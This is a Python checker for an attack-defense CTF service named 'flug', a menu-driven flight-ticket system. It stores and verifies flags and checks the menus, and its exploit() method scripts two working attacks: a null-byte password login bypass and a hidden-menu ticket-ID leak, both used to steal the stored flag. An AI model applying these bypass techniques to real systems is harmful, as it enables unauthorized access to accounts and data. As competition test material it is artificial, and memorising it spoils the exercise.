#!/usr/bin/env python3
from enochecker import OfflineException, BrokenServiceException, run, BaseChecker
from string import ascii_lowercase
from random import randrange


#BrokenServiceException = broken but its reachable 
#OfflineException = obvious

class FlugChecker(BaseChecker):

    flag_count = 1
    noise_count = 1
    havoc_count = 1
    global port 
    port = 7478
    service_name = "flug"


    def putflag(self):  # type: () -> None
        username = self.gen_user()
        password = self.gen_password()


        """
        This method stores a flag in the service.
        In case multiple flags are provided, self.flag_idx gives the appropriate index.
        The flag itself can be retrieved from self.flag.
        On error, raise an Eno Exception.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """


        try:
            nc = self.connect(port=port)
        except:
            raise OfflineException("Unable to connect to the service [putflag]")



        try:    
            self.info('connection works, registering a new user')
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.write(b"2\n")
            
            nc.read_until(b"Please input your new username:\n")
            nc.write(bytes(username + "\n",'utf-8'))
            nc.read_until(b"Please input your password:\n")
            nc.write(bytes(password + "\n",'utf-8'))
        except:
            nc.close()
            
            raise BrokenServiceException("Registration failed [putflag]")


        try:
            self.info('loggin in as the new user')

            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.write(b"1\n")
            nc.read_until(b"Please input your username:\n")
            nc.write(bytes(username + "\n",'utf-8'))
            nc.read_until(b"Please input your password:\n")
            nc.write(bytes(password + "\n",'utf-8'))
        except:
            nc.close()

            raise BrokenServiceException("Login failed [putflag]")


        try:
            self.info('putting in the flag')
            nc.read_until(b"================\n")   
            nc.read_until(b"================\n")
            nc.write(b"1\n")
            nc.read_until(b"Please input origin airport\n")
            nc.write(bytes(self.noise + "\n",'utf-8'))
            nc.read_until(b"Please input destination airport\n")
            nc.write(bytes(self.noise + "\n",'utf-8'))
            nc.read_until(b"Enter the content of your new ticket\n")
            nc.write(bytes(self.flag + "\n",'utf-8'))
            nc.read_until(b"Your new ticket ID is:\n")
            ticket_id = nc.read_until(b"\n").decode('utf-8')
            self.info('inserting into db, putflag')

            self.team_db[self.flag] = (username,password,ticket_id)


        except:
            nc.close()

            raise BrokenServiceException("Put flag failed [putflag]")
        nc.close()

    def getflag(self):  # type: () -> None

        """
        This method retrieves a flag from the service.
        Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """

        try:
            nc = self.connect(port=port)
        except:
            raise OfflineException("Connection failed [getflag]")

        self.info('starting the putflag, calling check_bookings')

        self.check_bookings(nc)

        self.info('check_bookings worked')
        try:

            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.write(b"3\n")
            nc.read_until(b"Enter the unique id of your ticket")
            nc.write(bytes(self.team_db[self.flag][2] + "\n", 'utf-8'))
            nc.read_until(b"content:\n")
            flag2 = nc.read_until(b"\n").decode('utf-8').replace('\n','')
            self.info('the new flag was retrieved from the service')

        except:

            nc.close()
            raise BrokenServiceException("Unable to get flag from the service [getflag]")

        if flag2.strip() != self.flag.strip():
            nc.close()
            raise BrokenServiceException("The flags dont match! [getflag]")

        nc.close()

    def putnoise(self):  # type: () -> None
        username = self.gen_user()
        password = self.gen_password()

        """
        This method stores noise in the service. The noise should later be recoverable.
        The difference between noise and flag is, tht noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using self.flag_idx.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """

        try:
            nc = self.connect(port=port)
        except:
            raise OfflineException("Unable to connect to the service [putnoise]")



        try:    
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.write(b"2\n")
            
            nc.read_until(b"Please input your new username:")
            nc.write(bytes(username + "\n",'utf-8'))
            nc.read_until(b"Please input your password:\n")
            nc.write(bytes(password + "\n",'utf-8'))
        except:
            nc.close()
            raise BrokenServiceException("Registration failed [putnoise]")


        try:
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")

            nc.write(b"1\n")
            nc.read_until(b"Please input your username:\n")
            nc.write(bytes(username + "\n",'utf-8'))
            nc.read_until(b"Please input your password:\n")
            nc.write(bytes(password + "\n",'utf-8'))
        except:
            nc.close()
            raise BrokenServiceException("Login failed [putnoise]")


        try:
            nc.read_until(b"================\n")   
            nc.read_until(b"================\n")
            nc.write(b"1\n")
            nc.read_until(b"Please input origin airport\n")
            nc.write(bytes(self.noise + "\n",'utf-8'))
            nc.read_until(b"Please input destination airport\n")
            nc.write(bytes(self.noise + "\n",'utf-8'))
            nc.read_until(b"Enter the content of your new ticket\n")
            nc.write(bytes(self.noise + "\n",'utf-8'))
            nc.read_until(b"Your new ticket ID is:\n")
            ticket_id = nc.read_until(b"\n").decode('utf-8').replace('\n','')
            self.team_db[self.noise] = (username,password,ticket_id)
        except:
            nc.close()
            raise BrokenServiceException("Put flag failed [putnoise]")
        self.team_db["noise"] = self.noise
        nc.close()

    def getnoise(self):  # type: () -> None

        try:
            nc = self.connect(port=port)
        except:
            raise OfflineException("Connection failed [getnoise]")

        try:
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.write(b"3\n")
            nc.read_until(b"Enter the unique id of your ticket")
            nc.write(bytes(self.team_db[self.noise][2] + "\n", 'utf-8'))
            nc.read_until(b"content:\n")
            flag2 = nc.read_until(b"\n").decode('utf-8').replace('\n','')
        except:
            nc.close()
            raise BrokenServiceException("Unable to get noise from the service [getnoise]")
        if flag2.strip() != self.flag.strip().replace('\n',''):
            nc.close()
            raise BrokenServiceException("The noises dont mach! [getnoise]")

        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, tht noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using flag_idx.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        nc.close()

    def havoc(self):  # type: () -> None

        try:
            nc = self.connect(port=port)
        except:
            raise OfflineException("Connection failed [havoc]")
        pass_test = True

        # we login using current noise user
        test_user = self.gen_user()
        test_pass = self.gen_password()
        random_value = self.gen_password()

        #we check for words in these arrs when checking the menu
        must_be_in_menu1 = ['login','register','view ticket','exit','about','anonymous','bookings']
        must_be_in_view_ticket_menu = ['enter','ticket','id']
        must_be_in_menu_when_logged_in = ['buy ticket','view my tickets','view ticket','logout']


        try:
            self.info('registering a new user,[havoc]')
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.write(b"2\n")

            nc.read_until(b"Please input your new username:\n")
            nc.write(bytes(test_user + "\n",'utf-8'))
            nc.read_until(b"Please input your password:\n")
            nc.write(bytes(test_pass + "\n",'utf-8'))
        except:
            nc.close()

            raise BrokenServiceException('')
        try:
            self.info('loggin in as the new user [havoc]')

            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.read_until(b"================\n")
            nc.write(b"1\n")
            nc.read_until(b"Please input your username:\n")
            nc.write(bytes(test_user + "\n",'utf-8'))
            nc.read_until(b"Please input your password:\n")
            nc.write(bytes(test_pass + "\n",'utf-8'))
            nc.read_until(b"================\n")
            logged_in_menu =nc.read_until(b"================\n").decode().lower()
            #Check the menu when logged in
            for elem in must_be_in_menu_when_logged_in:
                if elem not in logged_in_menu:
                    nc.close()
                    print('failed last test: \'{}\' not in menu'.format(elem))
                    raise BrokenServiceException('menu when logged isnt ok [havoc]')


        except:
            nc.close()

            raise BrokenServiceException("Login failed [havoc]")


        try:
            self.info('putting in random value [havoc]')
            nc.write(b"1\n")
            nc.read_until(b"Please input origin airport\n")
            nc.write(bytes(random_value + "\n",'utf-8'))
            nc.read_until(b"Please input destination airport\n")
            nc.write(bytes(random_value + "\n",'utf-8'))
            nc.read_until(b"Enter the content of your new ticket\n")
            nc.write(bytes(random_value + "\n",'utf-8'))
            nc.read_until(b"Your new ticket ID is:\n")
            ticket_id = nc.read_until(b"\n").decode('utf-8')
            self.info('inserting into db, havoc')
            nc.read_until(b"================\n")   
            nc.read_until(b"================\n")
            nc.write(b"4\n")

        except:
            nc.close()

            raise BrokenServiceException("Put flag failed [putflag]")

        #Check first menu
        nc.read_until(b"================\n")
        nc.read_until(b"================\n")
        menu1 = nc.read_until(b"================\n").decode().lower()
        for elem in must_be_in_menu1:
            if elem not in menu1:
                nc.close()
                print('failed first test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('Menu1 isnt ok [havoc]')

        nc.write(b'3\n')
        menu_after_view_ticket_global = nc.read_until(b'ticket\n').decode('utf-8').lower()
        #Check the view ticket message
        for elem in must_be_in_view_ticket_menu:
            if elem not in menu_after_view_ticket_global:
                nc.close()
                print('failed second test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('View Ticket menu is not ok [havoc]')

        nc.write(bytes(ticket_id + '\n','utf-8'))
        ticket_message = nc.read_until(b'\n').decode().lower()
        if 'the contents of your ticket' not in ticket_message:
            nc.close()
            raise BrokenServiceException('Can not input ticket in menu option 3')


        nc.read_until(b"================\n")
        nc.read_until(b"================\n")
        nc.read_until(b"================\n")
        nc.write(b'1\n')
        nc.read_until(b'\n')
        nc.write(bytes(test_user+'\n','utf-8'))
        nc.read_until(b'\n')
        nc.write(bytes(test_pass+'\n','utf-8'))

        nc.read_until(b"================\n")

        logged_in_menu =nc.read_until(b"================\n").decode().lower()
        #Check the menu when logged in
        for elem in must_be_in_menu_when_logged_in:
            if elem not in logged_in_menu:
                nc.close()
                print('failed last test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('menu when logged isnt ok [havoc]')

        nc.close()


        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """

    def exploit(self):  
        #1st vuln

        p = remote(self.address,port)
        username = self.team_db[self.flag][0]

        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b'1')
        p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
        p.sendlineafter(b"Please input your password:\n",'\x00')

        p.recvuntil('welcome ')
        check_line = p.recvline().decode('utf-8').replace('\n','')

        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b"2")
        stdo = p.recvline()
        flag_id = p.recvline().decode('utf-8').split(' ')[1]

        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b"3")
        p.sendlineafter(b"Enter the unique id of your ticket",bytes(flag_id,'utf-8'))
        p.recvline()
        p.recvline()
        flag = p.recvline().decode('utf-8').replace('\n','')

        if username == check_line:
            print(flag)
        else:
            print("Sad nox")
        pass

        #++++++++++++++++++++++++++++++++++++++++++++
        #++++++++++++++++++++++++++++++++++++++++++++
    
        #2nd wuln
    
        p = remote(self.address,port)

        username = self.team_db[self.flag][0] 

        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'1')
        p.sendlineafter('Please input your username:\n',bytes(username,'utf-8'))
        p.sendlineafter('Please input your password:\n',b'x_x_x_x_x_x')
        
        
        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'5')
        p.sendlineafter('Please input origin airport\n','x_x_x_x_x_x')
        p.sendlineafter('Please input destination airport\n','x_x_x_x_x_x')
        p.sendlineafter('Enter the content of your new ticket\n','x_x_x_x_x_x')
        p.recvuntil('Your new ticket ID is:\n')
        new_id = int(p.recvline().decode('utf-8').replace('\n',''),10)
        
        
        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'3')
        p.sendlineafter('Enter the unique id of your ticket\n',bytes(str(new_id),'utf-8'))
        p.recvline()
        p.recvline()
        p.recvline()
        flag_id = int(p.recvline().decode('utf-8').replace('\n',''),10)
        
        
        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'3')
        p.sendlineafter('Enter the unique id of your ticket\n',bytes(str(flag_id),'utf-8'))
        p.recvline()
        
        
        flag = str(p.recvline().decode('utf-8').replace('\n',''))
        
        print(flag)



    def gen_user(self): 
        source = list(ascii_lowercase)
        username =''
        for num in range(25):
            rand_int = randrange(25)
            username += source[rand_int]
        return username



    def gen_password(self): 
        source = list(ascii_lowercase)
        password =''
        for num in range(25):
            rand_int = randrange(25)
            password += source[rand_int]
        return password


    def check_bookings(self, telnet):
        try:
            telnet.read_until(b"================\n")
            telnet.read_until(b"================\n")
            telnet.read_until(b"================\n")
            telnet.write(b'4\n')
            text = telnet.read_until(b'Welcome to the airport\n', timeout=self.time_remaining).decode().split('\n')
        except Exception as e:
            self.info("Failed to Check bookings", exc_info=e)
            telnet.close()
            raise BrokenServiceException('User was not found')
            
        if not self.team_db[self.flag][0] in text:
            self.info('User was not found')
            telnet.close()
            raise BrokenServiceException('User was not found')
        else:
            self.info('Use found')

        """
        res = telnet.read_until(b'\n').decode('utf-8').strip().replace('\n','')
        while  res != self.team_db[self.flag][0] or 'Welcome ' in res:
            print('in view bookings: {}\nin db: '.format(res,self.team_db[self.flag][0]))      
            res = telnet.read_until(b'\n').decode().strip().replace('\n','')
        return res
"""



app = FlugChecker.service

if __name__ == "__main__":
        run(FlugChecker)
